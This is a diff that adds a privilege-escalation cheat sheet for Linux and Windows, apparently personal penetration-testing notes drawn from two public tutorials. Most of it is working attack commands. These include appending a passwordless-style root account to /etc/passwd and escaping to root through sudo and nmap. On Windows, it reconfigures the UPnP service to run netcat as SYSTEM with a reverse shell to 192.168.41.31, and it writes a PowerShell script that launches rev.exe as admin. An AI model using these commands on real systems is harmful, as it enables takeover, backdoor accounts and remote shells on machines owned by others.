@@ -1,0 +1,86 @@
+
+--- Linux ---
+
+Website: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+
+Script: 
+linuxprivchecker.py
+
+
+Checking which services are run as root:
+ps aux | grep root
+
+
+Checking which jobs are scheduled:
+ls -al /etc/cron*
+
+
+Checking world-writable files:
+find /etc/ -readable -type f -perm 777 2>/dev/null 
+
+
+Verifying file permissions:
+find / -perm -u=s -type f 2>/dev/null
+
+
+Nmap interactive:
+sudo nmap --interactive
+
+
+Adding an alternate root account to the /etc/passwd file:
+perl -le 'print crypt("foo", "aa")'
+echo "aa:aaKNIEDOaueR6:0:0:aa:/aa:/bin/bash" >> /etc/passwd 
+
+
+Switching to the alternate root account:
+su aa
+foo
+
+
+Switching to sudoer if sudoer:
+sudo /bin/bash
+
+
+Notes:
+- Check passwd file permissions, this is usually an easy way in.
+- Check permissions on relevant important files; this usually throws errors due to improper permissions.
+
+
+
+--- Windows ---
+
+Website: http://www.fuzzysecurity.com/tutorials/16.html
+
+
+Checking the system's users:
+net users
+net user alice
+net user bethany
+
+
+Checking the running processes:
+tasklist /SVC
+
+
+Checking service configuration for a notorious insecure service:
+sc qc upnphost
+
+
+Reconfiguring the UPnP Device Host service to run a binary of choosing with SYSTEM privileges, in this case, nc.exe:
+sc qc upnphost
+sc config upnphost binPath= "C:\Users\Public\nc.exe -nv 192.168.41.31 443 -e C:\Windows\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+net start upnphost
+
+
+Using Powershell to RunAs an administrative user:
+echo $secpasswd = ConvertTo-SecureString "" -AsPlainText -Force > run.ps1
+echo $mycreds = New-Object System.Management.Automation.PSCredential ("admin", $secpasswd) >> run.ps1
+echo $computer = "DANCING-PARROT" >> run.ps1
+echo [System.Diagnostics.Process]::Start("C:\xampp\webdav\rev.exe","", >> run.ps1
+echo $mycreds.Username, $mycreds.Password, $computer) >> run.ps1
+powershell -ExecutionPolicy Bypass -File run.ps1
+
+
+
